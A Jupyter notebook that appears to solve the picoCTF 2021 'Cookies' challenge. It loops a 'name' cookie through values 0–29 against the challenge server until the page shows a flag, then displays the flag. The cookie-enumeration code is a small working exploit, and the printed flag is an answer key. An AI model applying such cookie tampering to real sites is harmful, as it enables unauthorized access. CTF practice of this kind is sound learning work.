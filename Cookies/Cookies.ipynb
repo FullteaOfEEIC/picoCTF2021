{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "tight-piano",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from IPython.display import HTML\n",
    "from tqdm.auto import tqdm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "considered-coating",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6e8866d4be304f94876f58f64681cdc7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/30 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "18\n"
     ]
    }
   ],
   "source": [
    "for i in tqdm(range(30)):\n",
    "    with requests.Session() as s:\n",
    "        jar = requests.cookies.RequestsCookieJar()\n",
    "        jar.set('name', str(i), domain='mercury.picoctf.net', path='/')\n",
    "        s.cookies.update(jar)\n",
    "        page = s.get(\"http://mercury.picoctf.net:6418\")\n",
    "        if \"picoCTF{\" in page.text:\n",
    "            print(i)\n",
    "            break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "entertaining-mapping",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE html>\n",
       "<html lang=\"en\">\n",
       "\n",
       "<head>\n",
       "    <title>Cookies</title>\n",
       "\n",
       "\n",
       "    <link href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css\" rel=\"stylesheet\">\n",
       "\n",
       "    <link href=\"https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css\" rel=\"stylesheet\">\n",
       "\n",
       "    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n",
       "\n",
       "    <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\"></script>\n",
       "\n",
       "</head>\n",
       "\n",
       "<body>\n",
       "\n",
       "    <div class=\"container\">\n",
       "        <div class=\"header\">\n",
       "            <nav>\n",
       "                <ul class=\"nav nav-pills pull-right\">\n",
       "                    <li role=\"presentation\"><a href=\"/reset\" class=\"btn btn-link pull-right\">Home</a>\n",
       "                    </li>\n",
       "                </ul>\n",
       "            </nav>\n",
       "            <h3 class=\"text-muted\">Cookies</h3>\n",
       "        </div>\n",
       "\n",
       "        <div class=\"jumbotron\">\n",
       "            <p class=\"lead\"></p>\n",
       "            <p style=\"text-align:center; font-size:30px;\"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>\n",
       "        </div>\n",
       "\n",
       "\n",
       "        <footer class=\"footer\">\n",
       "            <p>&copy; PicoCTF</p>\n",
       "        </footer>\n",
       "\n",
       "    </div>\n",
       "</body>\n",
       "\n",
       "</html>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(page.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
